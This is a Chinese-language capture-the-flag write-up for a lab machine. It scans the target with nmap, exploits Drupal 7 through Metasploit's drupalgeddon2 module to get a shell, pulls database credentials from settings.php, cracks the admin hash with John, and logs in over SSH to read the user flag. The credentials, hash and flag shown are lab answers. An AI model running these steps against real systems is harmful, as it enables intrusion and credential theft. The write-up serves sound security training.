 0x01 信息收集


端口扫描：

nmap -A-sC -sV -T4 -sS 10.10.10.233

开放22、80端口，我们使用浏览器访问80端口的web服务

是一个带有用户登录的web页面。

 


0x02漏洞搜索和利用


使用ctrl+U查看源代码

发现它的CMS是Drupal7，我们可以试着使用metasploit查找漏洞试试，输入：

search Drupal

发现有7个，我们使用drupalgeddon2。

use exploit/unix/webapp/drupal_drupalgeddon2//进入此模块show options //查看所有选项

set lhost 10.10.14.9 //设置本机ip地址set rhosts 10.10.10.233 //设置目标主机地址exploit

漏洞利用成功！获取shell。然后ls查看下有哪些文件

发现有个sites目录，查看有什么，并且进入此目录

发现有个default默认文件夹，进入查看有个settings.php，看起来是个配置文件，查看里面的内容

发现里面有连接mysql数据库的数据库名drupal和用户名drupaluser和密码CQHEy@9M*m23gBVj

然后连接数据库查看用户名和密码（使用mysql -u -p好像都报错，发现需要加上本地主机）

mysql -u drupaluser -h localhost -p

发现最后面有个user表（shell连接比较卡，先这样弄）

Select * from users;Show;

得到brucetherealadmin用户的密码HASH：

$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt

我们使用John工具，用kali自带字典rockyou.txt破解它，在桌面创建一个hash.txt，将管理员密码HASH写进去（使用rockyou字典需要先解压，它一开始是给你压缩包形式）

john hash.txt -w /usr/share/wordlists/rockyou.txt


破解出来密码是booboo。然后使用SSH去连接

ssh brucetherealadmin@10.10.10.233

然后根目录下获得user flag

12e40616b5a593ecae564ad758957eb5
